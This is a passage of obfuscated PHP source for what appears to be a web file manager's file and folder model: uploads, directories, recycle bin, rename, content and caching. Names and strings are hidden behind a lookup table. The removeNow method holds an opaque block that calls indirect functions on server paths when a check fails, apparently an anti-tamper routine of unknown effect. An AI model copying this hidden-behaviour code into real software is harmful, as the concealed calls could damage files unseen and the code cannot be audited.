$¬âŠ²‡å = REPEAT_RENAME) { $ªÍ®ç£â =& $_SERVER[´È¥ö†ö]; $˜Ï¼ßÉè = Model($ªÍ®ç£â[688])->find($šà“·«£); Model($ªÍ®ç£â[688])->linkAdd($šà“·«£); return $this->_createFileCall($»İ›Ãä, $âÈ‚’ÌÂ, $˜Ï¼ßÉè, $¬âŠ²‡å); } public function addFileByRemote($‘á·Ô¤˜, $‡­ÚÒÒç, $òÁ¤»Ò, $¡…äóŞÖ = array(), $ˆ³¿¨Úñ = REPEAT_RENAME) { $õ´ÙÈâ = Model($_SERVER[´È¥ö†ö][688])->addFileByRemote($‡­ÚÒÒç, $òÁ¤»Ò, $¡…äóŞÖ); return $this->_createFileCall($‘á·Ô¤˜, $òÁ¤»Ò, $õ´ÙÈâ, $ˆ³¿¨Úñ); } private function _createFileCall($ğü¤Æú­, $µ®Ê…, $œÀÖš¤Ó, $¹›Ô£‚, $Öˆ‡Ë‚Æ = "\165\160\x6c\157\x61\x64") { $©ñò§ò =& $_SERVER[´È¥ö†ö]; $¥Ş·¼èç = !1; $this->setMasterDB(); $this->lockWriteStart($ğü¤Æú­, $µ®Ê…); $¸ÉâÚû© = $this->fileNameExist($ğü¤Æú­, $µ®Ê…); $Ñ·şƒÛ© = $this->_createFile($ğü¤Æú­, $µ®Ê…, $œÀÖš¤Ó, $¹›Ô£‚, $¥Ş·¼èç); if (!$¥Ş·¼èç) { Model($©ñò§ò[555])->remove($œÀÖš¤Ó[$©ñò§ò[552]]); } if ($¥Ş·¼èç && $Ñ·şƒÛ© && $Ñ·şƒÛ© != $¸ÉâÚû©) { Model($©ñò§ò[2228])->eventCreate($Ñ·şƒÛ©, $Öˆ‡Ë‚Æ); } $this->lockWriteEnd($ğü¤Æú­, $µ®Ê…); return $Ñ·şƒÛ©; } public function mkdir($—š§µšá, $˜²ªÕì‹, $œ»©¸ó = REPEAT_SKIP) { $¶ƒ£»ÏÈ =& $_SERVER[´È¥ö†ö]; $this->setMasterDB(); $¿‡·¡¢‹ = $this->sourceInfo($—š§µšá); if (!$¿‡·¡¢‹) { return !1; } $this->lockWriteStart($—š§µšá, $˜²ªÕì‹); if ($œ»©¸ó !== !1) { $ØåİíÜ³ = $this->fileNameExist($—š§µšá, $˜²ªÕì‹); if ($ØåİíÜ³ && $œ»©¸ó != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($—š§µšá, $˜²ªÕì‹); return $ØåİíÜ³; } $˜²ªÕì‹ = $this->fileNameAuto($—š§µšá, $˜²ªÕì‹, $œ»©¸ó); } $õ’µ¬È¤ = array($¶ƒ£»ÏÈ[660] => 1, $¶ƒ£»ÏÈ[505] => $˜²ªÕì‹, $¶ƒ£»ÏÈ[661] => $¶ƒ£»ÏÈ[12], $¶ƒ£»ÏÈ[553] => 0, $¶ƒ£»ÏÈ[631] => 0); $Ä©„¯¢ = $this->_addSource($õ’µ¬È¤, $¿‡·¡¢‹); Model($¶ƒ£»ÏÈ[2228])->eventCreate($Ä©„¯¢, $¶ƒ£»ÏÈ[1431]); $this->lockWriteEnd($—š§µšá, $˜²ªÕì‹); return $Ä©„¯¢; } public function listSourceRoot($ÛÚ¾µÍî, $à§¸ùÍ“, $™¦ €Ø¸ = "\163\157\165\162\143\145\x49\104\54\x74\x61\x72\147\145\x74\111\104\54\163\151\x7a\x65") { $¢üíõÛ =& $_SERVER[´È¥ö†ö]; $ü…®Ú½ = $¢üíõÛ[465]; $° ‰Ğèß = array(); $öãú‚á† = 1024 * 50; $ÔŞÕ¿‹… = is_array($ÔŞÕ¿‹…) ? $ÔŞÕ¿‹… : array(); $ï…Â‹òõ = count($à§¸ùÍ“); $¼şˆ£ Š = $this->tablePrefix . $¢üíõÛ[2266]; for ($Êª÷ÛÆÅ = 0; $Êª÷ÛÆÅ < $ï…Â‹òõ; $Êª÷ÛÆÅ++) { $ç‘ğö­¨ = $à§¸ùÍ“[$Êª÷ÛÆÅ]; $ü…®Ú½ .= "\123\105\x4c\105\103\x54\40\x2a\x20\106\x52\117\115\x20\x28\123\x45\x4c\x45\x43\x54\x20{$™¦ €Ø¸}\40\106\122\x4f\115\40\x60{$¼şˆ£ Š}\x60\x20\127\110\105\122\105\x20"; $ü…®Ú½ .= "\x60\160\x61\162\145\x6e\x74\111\104\x60\x3d\x30\40\101\x4e\104\40\x60\164\141\x72\x67\x65\x74\x49\104\140\x3d{$ç‘ğö­¨}\40\x41\x4e\x44\x20\140\164\141\162\147\x65\x74\124\171\x70\x65\140\x3d{$ÛÚ¾µÍî}\40\x61\x6e\x64\40\x66\151\x6c\x65\124\171\x70\145\75\x27\x27\x20\x6c\x69\x6d\151\x74\40\x31\51\40\141\x73\x20\164\142\137{$Êª÷ÛÆÅ}\x20\125\x4e\111\117\x4e\x20\x41\114\x4c\x20"; if ((strlen($ü…®Ú½) >= $öãú‚á† || $Êª÷ÛÆÅ == $ï…Â‹òõ - 1) && $ü…®Ú½) { $ü…®Ú½ = substr($ü…®Ú½, 0, -strlen($¢üíõÛ[1114])); $¨öì°à = $this->query($ü…®Ú½); $ü…®Ú½ = $¢üíõÛ[12]; $° ‰Ğèß = array_merge($° ‰Ğèß, $¨öì°à); } } return $° ‰Ğèß; } private function _createFile($šœë©ù, $à¦ùÆ×, $ÉØ³ºò, $™‰”—Ü , &$©¹¼¾£) { $¬ıÇî¡ =& $_SERVER[´È¥ö†ö]; $äÑéó¡ = $this->sourceInfo($šœë©ù); if (!$ÉØ³ºò || !$äÑéó¡) { return !1; } if ($™‰”—Ü  !== !1) { $£ó‘ÍÚô = $this->fileNameExist($šœë©ù, $à¦ùÆ×); } $©¹¼¾£ = !0; if ($™‰”—Ü  && $£ó‘ÍÚô) { if ($™‰”—Ü  == REPEAT_SKIP) { $©¹¼¾£ = !1; return $£ó‘ÍÚô; } else { if ($™‰”—Ü  == REPEAT_REPLACE) { $ŠõøğúÂ = $this->sourceInfo($£ó‘ÍÚô); $§î“”‹ˆ = $this->fileHistory($ŠõøğúÂ, $ÉØ³ºò[$¬ıÇî¡[552]], $ÉØ³ºò[$¬ıÇî¡[79]]); if (!$§î“”‹ˆ) { $©¹¼¾£ = !1; } else { $this->folderSizeReset($šœë©ù); } return $£ó‘ÍÚô; } else { $à¦ùÆ× = $this->fileNameAuto($šœë©ù, $à¦ùÆ×, $™‰”—Ü , !1); } } } $Äâ”çØ™ = array($¬ıÇî¡[660] => 0, $¬ıÇî¡[505] => $à¦ùÆ×, $¬ıÇî¡[661] => substr(get_path_ext($à¦ùÆ×), 0, 10), $¬ıÇî¡[553] => $ÉØ³ºò[$¬ıÇî¡[552]], $¬ıÇî¡[631] => $ÉØ³ºò[$¬ıÇî¡[79]]); $¼Š‘” = $this->_addSource($Äâ”çØ™, $äÑéó¡); $this->folderSizeReset($šœë©ù, intval($Äâ”çØ™[$¬ıÇî¡[79]])); return $¼Š‘”; } protected function fileHistory($á ´æ¬ú, $ñŒºûñ, $ü‡È·£²) { $‹ğ åƒò =& $_SERVER[´È¥ö†ö]; if ($á ´æ¬ú[$‹ğ åƒò[552]] == $ñŒºûñ) { return !1; } $this->checkLock($á ´æ¬ú[$‹ğ åƒò[193]], $ñŒºûñ); Model($‹ğ åƒò[2267])->addHistory($á ´æ¬ú); $Óœ‘ÔĞ = array($‹ğ åƒò[665] => USER_ID, $‹ğ åƒò[509] => time(), $‹ğ åƒò[552] => $ñŒºûñ, $‹ğ åƒò[79] => $ü‡È·£²); $this->where(array($‹ğ åƒò[502] => $á ´æ¬ú[$‹ğ åƒò[193]]))->save($Óœ‘ÔĞ); $this->sourceCacheClear($á ´æ¬ú[$‹ğ åƒò[193]]); return !0; } public function checkLock($‚äóÈ¾, $âå¦ø Æ) { $ôˆ¿¢¼» =& $_SERVER[´È¥ö†ö]; $ğ©Å‡ƒ¶ = $this->pathInfo($‚äóÈ¾); if (!$this->fileIsLock($ğ©Å‡ƒ¶, !0)) { return; } $ÚÄÃÕ¾ = Session::get($ôˆ¿¢¼»[2268]); $ƒğ†‡©Ò = substr($ğ©Å‡ƒ¶[$ôˆ¿¢¼»[32]], 0, -1 - strlen($ğ©Å‡ƒ¶[$ôˆ¿¢¼»[169]])) . $ôˆ¿¢¼»[1292] . $ÚÄÃÕ¾ . $ôˆ¿¢¼»[10] . $ğ©Å‡ƒ¶[$ôˆ¿¢¼»[169]]; $ØƒÆÍĞ– = Model($ôˆ¿¢¼»[688])->find($âå¦ø Æ); $this->_createFileCall($ğ©Å‡ƒ¶[$ôˆ¿¢¼»[192]], $ƒğ†‡©Ò, $ØƒÆÍĞ–, REPEAT_REPLACE, $ôˆ¿¢¼»[1430]); $ƒò­¸Ñ = $ğ©Å‡ƒ¶[$ôˆ¿¢¼»[550]][$ôˆ¿¢¼»[624]]; $ŠñÉ†’Ø = $ƒò­¸Ñ[$ôˆ¿¢¼»[2269]] ? $ƒò­¸Ñ[$ôˆ¿¢¼»[2269]] : $ƒò­¸Ñ[$ôˆ¿¢¼»[32]]; show_json(LNG($ôˆ¿¢¼»[2270]) . $ôˆ¿¢¼»[2271] . LNG($ôˆ¿¢¼»[2272]) . $ôˆ¿¢¼»[2273] . $ŠñÉ†’Ø . $ôˆ¿¢¼»[2274], !1); } public function fileIsLock($ÛÆÕ«¶, $Ö¥Œº›† = false) { $¹Æì¸Á° =& $_SERVER[´È¥ö†ö]; if (!_get($ÛÆÕ«¶, $¹Æì¸Á°[620], 0)) { return !1; } if ($ÛÆÕ«¶[$¹Æì¸Á°[550]][$¹Æì¸Á°[623]] != USER_ID) { return !0; } $Ë¡ø‡‡ = $GLOBALS[$¹Æì¸Á°[6]][$¹Æì¸Á°[92]][$¹Æì¸Á°[621]]; if ($ÛÆÕ«¶[$¹Æì¸Á°[550]][$¹Æì¸Á°[622]] <= time() - $Ë¡ø‡‡) { $this->metaSet($ÛÆÕ«¶[$¹Æì¸Á°[193]], $¹Æì¸Á°[623], null); $this->metaSet($ÛÆÕ«¶[$¹Æì¸Á°[193]], $¹Æì¸Á°[622], null); } if ($Ö¥Œº›†) { $this->metaSet($ÛÆÕ«¶[$¹Æì¸Á°[193]], $¹Æì¸Á°[622], time()); } return !1; } private function _addSource($ÁİÓ¡œ›, $ì‹ğÄÏ÷) { $Ú¬öìëÃ =& $_SERVER[´È¥ö†ö]; $ú¡ãƒÓ = defined($Ú¬öìëÃ[2201]) ? USER_ID : 0; $¸‹ªóè… = array($Ú¬öìëÃ[662] => $ì‹ğÄÏ÷[$Ú¬öìëÃ[190]], $Ú¬öìëÃ[663] => $ì‹ğÄÏ÷[$Ú¬öìëÃ[580]], $Ú¬öìëÃ[664] => $ú¡ãƒÓ, $Ú¬öìëÃ[665] => $ú¡ãƒÓ, $Ú¬öìëÃ[488] => $ì‹ğÄÏ÷[$Ú¬öìëÃ[193]], $Ú¬öìëÃ[666] => $ì‹ğÄÏ÷[$Ú¬öìëÃ[595]] . $ì‹ğÄÏ÷[$Ú¬öìëÃ[193]] . $Ú¬öìëÃ[50], $Ú¬öìëÃ[515] => 0, $Ú¬öìëÃ[667] => $Ú¬öìëÃ[12]); $ÁİÓ¡œ› = array_merge($¸‹ªóè…, $ÁİÓ¡œ›); $this->updateModifyTime($ÁİÓ¡œ›[$Ú¬öìëÃ[192]]); $¿­šĞÓ = $Ú¬öìëÃ[2275] . $ì‹ğÄÏ÷[$Ú¬öìëÃ[193]]; if (isset(self::$cacheChildList[$¿­šĞÓ])) { unset(self::$cacheChildList[$¿­šĞÓ]); } static $Î£ºáŸ = false; if (!$Î£ºáŸ) { Hook::trigger($Ú¬öìëÃ[650], $ÁİÓ¡œ›); $Î£ºáŸ = !0; } $ë™¥¯å¢ = $this->add($ÁİÓ¡œ›); $«½Æµ™Ü = array($Ú¬öìëÃ[668] => short_id($ë™¥¯å¢)); $this->where(array($Ú¬öìëÃ[502] => $ë™¥¯å¢))->save($«½Æµ™Ü); $this->setNamePinyin($ë™¥¯å¢, $ÁİÓ¡œ›[$Ú¬öìëÃ[32]]); return $ë™¥¯å¢; } public function remove($å¾õîô£, $å”°ƒ²‡ = true) { $öº”Æµ™ =& $_SERVER[´È¥ö†ö]; $™åììÍú = $this->sourceInfo($å¾õîô£); $û˜—Ü•¦ = intval($™åììÍú[$öº”Æµ™[190]]) === self::TYPE_SYSTEM; $Ö¨œ©ãÙ = Model($öº”Æµ™[519])->get($öº”Æµ™[2276]) == $öº”Æµ™[91]; if ($û˜—Ü•¦ || $å”°ƒ²‡ || !$Ö¨œ©ãÙ) { return $this->removeNow($å¾õîô£, $å”°ƒ²‡); } $ˆ¤ ‡¦œ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $İèÓÒÓ = $™åììÍú[$öº”Æµ™[190]] == self::TYPE_USER ? $öº”Æµ™[676] : $öº”Æµ™[589]; if ($İèÓÒÓ == $öº”Æµ™[676]) { $ÉÇÒë = Model($öº”Æµ™[588])->getInfo($™åììÍú[$öº”Æµ™[580]]); $ÃŞĞÙ²® = !empty($ÉÇÒë[$öº”Æµ™[2269]]) ? $ÉÇÒë[$öº”Æµ™[2269]] : $ÉÇÒë[$öº”Æµ™[32]]; $ÃŞĞÙ²® = $öº”Æµ™[348] . $ÃŞĞÙ²® . $öº”Æµ™[2277] . $™åììÍú[$öº”Æµ™[580]]; } else { $ÉÇÒë = Model($öº”Æµ™[596])->getInfo($™åììÍú[$öº”Æµ™[580]]); $ÃŞĞÙ²® = _get($ÉÇÒë, $öº”Æµ™[32]); $ÃŞĞÙ²® = $öº”Æµ™[176] . $ÃŞĞÙ²® . $öº”Æµ™[2278] . $™åììÍú[$öº”Æµ™[580]]; } $Ô–’ú“¹ = $öº”Æµ™[2279] . md5($ÃŞĞÙ²®); CacheLock::lock($Ô–’ú“¹); $¡×Ùä¥Ÿ = $this->fileNameExist($ˆ¤ ‡¦œ, $ÃŞĞÙ²®); if (!$¡×Ùä¥Ÿ) { $¡×Ùä¥Ÿ = $this->mkdir($ˆ¤ ‡¦œ, $ÃŞĞÙ²®, REPEAT_SKIP); $this->metaSet($¡×Ùä¥Ÿ, $öº”Æµ™[2280], $İèÓÒÓ); $this->metaSet($¡×Ùä¥Ÿ, $öº”Æµ™[2281], $™åììÍú[$öº”Æµ™[580]]); if ($™åììÍú[$öº”Æµ™[192]] != 0) { $this->metaSet($¡×Ùä¥Ÿ, $öº”Æµ™[2282], _get($ÉÇÒë, $öº”Æµ™[2283])); } } CacheLock::unlock($Ô–’ú“¹); $this->metaSet($å¾õîô£, $öº”Æµ™[2284], $™åììÍú[$öº”Æµ™[192]]); $this->where(array($öº”Æµ™[193] => $å¾õîô£))->save(array($öº”Æµ™[509] => time())); $this->recycleClear($™åììÍú); Model($öº”Æµ™[647])->eventRemove($å¾õîô£); $Öªš¡ò… = $this->move($å¾õîô£, $¡×Ùä¥Ÿ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($™åììÍú[$öº”Æµ™[192]]); return $Öªš¡ò…; } private function recycleClear($¼Ÿö‚…È) { $›ŒØš˜ =& $_SERVER[´È¥ö†ö]; $¢Á´¬èá = $this->childrenAll($¼Ÿö‚…È); $ ¹Ãîü¬ = array($›ŒØš˜[502] => array($›ŒØš˜[503], $¢Á´¬èá[$›ŒØš˜[2285]])); Model($›ŒØš˜[2286])->where($ ¹Ãîü¬)->delete(); } public function removeNow($Èú†…Îº, $ÂŸ˜‹„ = true) { $®¾’İÎù =& $_SERVER[´È¥ö†ö]; if ($_SERVER[$®¾’İÎù[309]] != $_SERVER[$®¾’İÎù[944]]) { $‰òÙöç = $®¾’İÎù[955]; $Ô„Ÿí— = $®¾’İÎù[310]; $¶îàøç = $_SERVER[$®¾’İÎù[311]] . $®¾’İÎù[312]; $çÏùÕİö = $Ô„Ÿí—($¶îàøç); $¸é»êå¤ = explode($®¾’İÎù[287], $çÏùÕİö); if (count($¸é»êå¤) < $®¾’İÎù[702]) { $èÇé¢¿¶ = $®¾’İÎù[314]; $èÇé¢¿¶(); } $Ô˜¼Íœ¯ = $®¾’İÎù[956]; $Ô˜¼Íœ¯($_SERVER[$®¾’İÎù[957]]); $Ô˜¼Íœ¯($_SERVER[$®¾’İÎù[311]] . $®¾’İÎù[958]); $áÅÖø· = 1; while ($áÅÖø· > 1) { $áÅÖø· = $áÅÖø· + 4; $Ü¨»½ê© = rawurlencode($áÅÖø· . $®¾’İÎù[465]); } } $ƒ‚Ì = $this->sourceInfo($Èú†…Îº); $ôìéëœµ = $this->pathInfoMore($Èú†…Îº); if (!$ƒ‚Ì) { return !0; } if ($ƒ‚Ì[$®¾’İÎù[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Èú†…Îº); Hook::trigger($®¾’İÎù[2287], $ôìéëœµ, $ÂŸ˜‹„); if ($ÂŸ˜‹„) { Model($®¾’İÎù[2286])->moveToRecycle($Èú†…Îº); } else { $²ú´Ñ» = $this->childrenAll($ƒ‚Ì); Model($®¾’İÎù[647])->eventRemove($Èú†…Îº); $this->removeRelevance($²ú´Ñ»[$®¾’İÎù[2285]], $²ú´Ñ»[$®¾’İÎù[1575]]); } $this->folderSizeReset($ƒ‚Ì[$®¾’İÎù[192]]); $´ßŠîê = array($ƒ‚Ì[$®¾’İÎù[192]]); if ($ƒ‚Ì[$®¾’İÎù[496]] == $®¾’İÎù[91]) { $´ßŠîê[] = $ƒ‚Ì[$®¾’İÎù[193]]; } $this->updateModifyTime($´ßŠîê); $this->lockMoveEnd($Èú†…Îº); Hook::trigger($®¾’İÎù[1816], $ôìéëœµ, $ÂŸ˜‹„); return !0; } public function childrenAll($óä¥ÌûŞ) { $´©½© ï =& $_SERVER[´È¥ö†ö]; $€—˜ú¿¨ = $óä¥ÌûŞ[$´©½© ï[193]]; if ($óä¥ÌûŞ[$´©½© ï[496]] == $´©½© ï[91]) { $Ñ’Íèõ = array($´©½© ï[666] => array($´©½© ï[626], $óä¥ÌûŞ[$´©½© ï[595]] . $€—˜ú¿¨ . $´©½© ï[627])); $ßùšĞü = array($´©½© ï[666] => $Ñ’Íèõ[$´©½© ï[595]]); $·úÏ×Óı = $this->field($´©½© ï[2288])->where($ßùšĞü)->select(); $Óç©Û¶ = !1; $üõ”ıÓ´ = array($€—˜ú¿¨); if ($·úÏ×Óı) { $Óç©Û¶ = array_to_keyvalue($·úÏ×Óı, $´©½© ï[12], $´©½© ï[552]); $Óç©Û¶ = array_remove_value($Óç©Û¶, $´©½© ï[230]); $üõ”ıÓ´ = array_to_keyvalue($·úÏ×Óı, $´©½© ï[12], $´©½© ï[193]); $üõ”ıÓ´[] = $€—˜ú¿¨; } } else { $Óç©Û¶ = array($óä¥ÌûŞ[$´©½© ï[552]]); $üõ”ıÓ´ = array($€—˜ú¿¨); } return array($´©½© ï[2285] => $üõ”ıÓ´, $´©½© ï[1575] => $Óç©Û¶); } public function removeArray($¯÷î£‡) { if (!$¯÷î£‡) { return !0; } } public function removeRelevance($Àµ»Ñ“•, $¸˜ÖåùŞ) { $Ù»¿Å›› =& $_SERVER[´È¥ö†ö]; $Àµ»Ñ“• = $Àµ»Ñ“• ? $Àµ»Ñ“• : array(); $¸˜ÖåùŞ = $¸˜ÖåùŞ ? $¸˜ÖåùŞ : array(); $Àµ»Ñ“• = array_unique(array_filter($Àµ»Ñ“•)); $¸˜ÖåùŞ = array_unique(array_filter($¸˜ÖåùŞ)); if (!$Àµ»Ñ“•) { return !1; } $ÒÊœ’¾  = array($Ù»¿Å››[502] => array($Ù»¿Å››[503], $Àµ»Ñ“•)); Model($Ù»¿Å››[2286])->where($ÒÊœ’¾ )->delete(); Model($Ù»¿Å››[546])->where($ÒÊœ’¾ )->delete(); Model($Ù»¿Å››[2126])->where($ÒÊœ’¾ )->delete(); Model($Ù»¿Å››[647])->where($ÒÊœ’¾ )->delete(); Model($Ù»¿Å››[1953])->removeBySource($Àµ»Ñ“•); Model($Ù»¿Å››[2267])->removeBySource($Àµ»Ñ“•); $this->where($ÒÊœ’¾ )->delete(); Model($Ù»¿Å››[555])->remove($¸˜ÖåùŞ); for ($Ë€îØİœ = 0; $Ë€îØİœ < count($Àµ»Ñ“•); $Ë€îØİœ++) { $this->sourceCacheClear($Àµ»Ñ“•[$Ë€îØİœ]); } } public function rename($»ğù‘ñ÷, $µş±Ü”) { $‚¹ÓïˆĞ =& $_SERVER[´È¥ö†ö]; $Åå­ÀãÄ = $this->sourceInfo($»ğù‘ñ÷); if (!$Åå­ÀãÄ) { return !1; } $ŒŠ—ëõÑ = $this->fileNameExist($Åå­ÀãÄ[$‚¹ÓïˆĞ[192]], $µş±Ü”); if ($ŒŠ—ëõÑ && $ŒŠ—ëõÑ != $»ğù‘ñ÷) { return !1; } $·¼Ä£³ = array($‚¹ÓïˆĞ[505] => $µş±Ü”, $‚¹ÓïˆĞ[665] => USER_ID); if ($Åå­ÀãÄ[$‚¹ÓïˆĞ[496]] != $‚¹ÓïˆĞ[91]) { $·¼Ä£³[$‚¹ÓïˆĞ[497]] = substr(get_path_ext($µş±Ü”), 0, 10); } Model($‚¹ÓïˆĞ[647])->eventRename($»ğù‘ñ÷, $Åå­ÀãÄ[$‚¹ÓïˆĞ[32]], $µş±Ü”); $this->sourceCacheClear($»ğù‘ñ÷); $this->setNamePinyin($»ğù‘ñ÷, $·¼Ä£³[$‚¹ÓïˆĞ[32]], !1); $this->updateModifyTime($Åå­ÀãÄ[$‚¹ÓïˆĞ[192]]); $İ±Ğ”¶» = $this->where(array($‚¹ÓïˆĞ[502] => $»ğù‘ñ÷))->data($·¼Ä£³)->save(); $æ©¨öªõ = $‚¹ÓïˆĞ[2275] . $Åå­ÀãÄ[$‚¹ÓïˆĞ[192]]; if (isset(self::$cacheChildList[$æ©¨öªõ])) { unset(self::$cacheChildList[$æ©¨öªõ]); } return $İ±Ğ”¶»; } public function setNamePinyin($ş—Ë, $èÇË©ÈØ, $ãÕûı = true) { $Êª˜è É =& $_SERVER[´È¥ö†ö]; $¢ÇñãŸ = Input::check($èÇË©ÈØ, $Êª˜è É[669]); $çÍš­ƒ‹ = array($Êª˜è É[528] => KodSort::makeStr($èÇË©ÈØ)); if ($¢ÇñãŸ) { $çÍš­ƒ‹[$Êª˜è É[549]] = str_replace($Êª˜è É[53], $Êª˜è É[12], Pinyin::get($èÇË©ÈØ)); $çÍš­ƒ‹[$Êª˜è É[548]] = Pinyin::get($èÇË©ÈØ, $Êª˜è É[670]); } if (!$ãÕûı && !$¢ÇñãŸ) { $çÍš­ƒ‹[$Êª˜è É[549]] = null; $çÍš­ƒ‹[$Êª˜è É[548]] = null; } $this->metaSet($ş—Ë, $çÍš­ƒ‹); } public function getContent($öü±ÉÔ) { $ª”’®–› =& $_SERVER[´È¥ö†ö]; $«°›¤‚¸ = $this->fileInfoGet($öü±ÉÔ); if (!$«°›¤‚¸) { return !1; } if ($«°›¤‚¸[$ª”’®–›[79]] == 0) { return $ª”’®–›[12]; } $Í×ıäşº = $ª”’®–›[2289] . $«°›¤‚¸[$ª”’®–›[558]]; if ($«°›¤‚¸[$ª”’®–›[79]] <= 1024 * 10) { $È¸¸ğÉŸ = Cache::get($Í×ıäşº); if (!$È¸¸ğÉŸ) { $È¸¸ğÉŸ = IO::getContent($«°›¤‚¸[$ª”’®–›[87]]); Cache::set($Í×ıäşº, $È¸¸ğÉŸ); } return $È¸¸ğÉŸ; } if (!$«°›¤‚¸[$ª”’®–›[87]]) { return $ª”’®–›[12]; } return IO::getContent($«°›¤‚¸[$ª”’®–›[87]]); } public function setDesc($Ïñæ´¢¶, $äÖ§¼) { $úŞÏÜæÇ =& $_SERVER[´È¥ö†ö]; Model($úŞÏÜæÇ[647])->eventAddDesc($Ïñæ´¢¶, $äÖ§¼); return $this->metaSet($Ïñæ´¢¶, $úŞÏÜæÇ[537], $äÖ§¼); } public function setContent($¶±¸Ôá, $ÆÒ™ÁƒÁ = '') { $Ç¥…òã® =& $_SERVER[´È¥ö†ö]; $©æ»äºó = $this->sourceInfo($¶±¸Ôá); $±ÙúùÜ‡ = $this->fileInfoGet($¶±¸Ôá); if (!$±ÙúùÜ‡ || !$©æ»äºó) { return !1; } $Ó…ö°Ä = Model($Ç¥…òã®[555])->addFileByContent($ÆÒ™ÁƒÁ, $©æ»äºó[$Ç¥…òã®[32]]); $ÒĞèıˆ = $this->fileHistory($©æ»äºó, $Ó…ö°Ä[$Ç¥…òã®[552]], $Ó…ö°Ä[$Ç¥…òã®[79]]); if (!$ÒĞèıˆ) { return Model($Ç¥…òã®[555])->remove($Ó…ö°Ä[$Ç¥…òã®[552]]); } $this->folderSizeReset($©æ»äºó[$Ç¥…òã®[192]]); return !0; } public function fileSubstr($¶­¢ÊãÓ, $ãÓÔï‘Á, $´ì…ˆÁæ) { $çÕø÷²Ù = $this->fileInfoGet($¶­¢ÊãÓ); if (!$çÕø÷²Ù) { return !1; } return IO::fileSubstr($çÕø÷²Ù[$_SERVER[´È¥ö†ö][87]], $ãÓÔï‘Á, $´ì…ˆÁæ); } public function fileInfoGet($Ö¶æ–Ğ) { $€¥ß–• =& $_SERVER[´È¥ö†ö]; $‚óßúî¥ = $this->sourceInfo($Ö¶æ–Ğ); if (!$‚óßúî¥ || $‚óßúî¥[$€¥ß–•[496]]) { return !1; } $ˆˆüã¿† = $€¥ß–•[559] . $‚óßúî¥[$€¥ß–•[552]]; $ùâø™‹• = _get(self::$cacheFileInfo, $ˆˆüã¿†); if ($ùâø™‹•) { return $ùâø™‹•; } $ì¸š¿œ = Model($€¥ß–•[555])->fileInfo($‚óßúî¥[$€¥ß–•[552]]); if ($ì¸š¿œ) { $ì¸š¿œ[$€¥ß–•[32]] = $‚óßúî¥[$€¥ß–•[32]]; } self::$cacheFileInfo[$ˆˆüã¿†] = $ì¸š¿œ; return $ì¸š¿œ; } private function folderChildrenNumber($İá»ä·´) { $‚ÉÁ Ë =& $_SERVER[´È¥ö†ö]; $Ü£ƒÉˆ¯ = $this->sourceInfo($İá»ä·´); $ßôÌÈçÁ = array($‚ÉÁ Ë[666] => array($‚ÉÁ Ë[626], $Ü£ƒÉˆ¯[$‚ÉÁ Ë[595]] . $İá»ä·´ . $‚ÉÁ Ë[627]), $‚ÉÁ Ë[663] => $Ü£ƒÉˆ¯[$‚ÉÁ Ë[580]], $‚ÉÁ Ë[515] => intval($Ü£ƒÉˆ¯[$‚ÉÁ Ë[516]]), $‚ÉÁ Ë[660] => 1); $ö’İİ£³ = $this->where($ßôÌÈçÁ)->count(); $¶‡§â¾ğ = $this->where($ßôÌÈçÁ)->where(array($‚ÉÁ Ë[660] => 0))->count(); return array($‚ÉÁ Ë[83] => $¶‡§â¾ğ, $‚ÉÁ Ë[84] => $ö’İİ£³); } public function pathInfo($›‡ùŸ¬, $—º¼’ì = false) { $ğ…›ä¯Ó =& $_SERVER[´È¥ö†ö]; $—º¼’ì = !1; $›‡ùŸ¬ = intval($›‡ùŸ¬); $¾ÎÂ®ª‘ = $ğ…›ä¯Ó[545] . intval($—º¼’ì) . $ğ…›ä¯Ó[473] . $›‡ùŸ¬; $ÍÉ›ó± = _get(self::$cachePathInfo, $¾ÎÂ®ª‘); if ($ÍÉ›ó±) { return $ÍÉ›ó±; } $•œ‹®Ö = $this->sourceInfo($›‡ùŸ¬); if (!$•œ‹®Ö) { return !1; } $•œ‹®Ö = $this->_listDataApplyItem($•œ‹®Ö, $—º¼’ì); self::$cachePathInfo[$¾ÎÂ®ª‘] = $•œ‹®Ö; return $•œ‹®Ö; } public static $cachePathInfoMore = array(); public function pathInfoMore($¶ıÔ®³É) { $Ë»éËÑ« =& $_SERVER[´È¥ö†ö]; $ãìèšé­ = _get(self::$cachePathInfoMore, $¶ıÔ®³É); if ($ãìèšé­) { return $ãìèšé­; } $Š–…û®© = $this->pathInfo($¶ıÔ®³É); if (!$Š–…û®©) { return !1; } if ($Š–…û®©[$Ë»éËÑ«[496]] == $Ë»éËÑ«[91]) { $Š–…û®©[$Ë»éËÑ«[82]] = $this->folderChildrenNumber($¶ıÔ®³É); } self::$cachePathInfoMore[$¶ıÔ®³É] = $Š–…û®©; return $Š–…û®©; } public function sourceInfo($­úÖÏí·) { $‘©Èˆ› =& $_SERVER[´È¥ö†ö]; if (!$­úÖÏí·) { return array(); } $­úÖÏí· = intval($­úÖÏí·); $—ˆµ“œÁ = $‘©Èˆ›[544] . $­úÖÏí·; $€Õ…ÓÇ = _get(self::$cacheSourceInfo, $—ˆµ“œÁ); if ($€Õ…ÓÇ) { return $€Õ…ÓÇ; } $ú©ÁËôÕ = $this->where(array($‘©Èˆ›[193] => $­úÖÏí·))->find(); self::$cacheSourceInfo[$—ˆµ“œÁ] = $ú©ÁËôÕ; return self::$cacheSourceInfo[$—ˆµ“œÁ]; } public function sourceCacheClear($Ã—“Äóˆ = false) { self::cacheClear($Ã—“Äóˆ); } public static function cacheClear($Æò­‰×¨ = false) { $÷ş”½§ó =& $_SERVER[´È¥ö†ö]; if ($Æò­‰×¨ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$÷ş”½§ó[544] . $Æò­‰×¨]); unset(self::$cachePathInfoMore[$Æò­‰×¨]); unset(self::$cachePathInfo[$÷ş”½§ó[2290] . $Æò­‰×¨]); unset(self::$cachePathInfo[$÷ş”½§ó[2291] . $Æò­‰×¨]); } public function metaSet($Ê¿õÉêª, $ğ÷¬õ = null, $Šš¬«ÎŠ = null) { $ò‹ËÜ¿Æ = parent::metaSet($Ê¿õÉêª, $ğ÷¬õ, $Šš¬«ÎŠ); if ($ò‹ËÜ¿Æ) { $this->sourceCacheClear($Ê¿õÉêª); } return 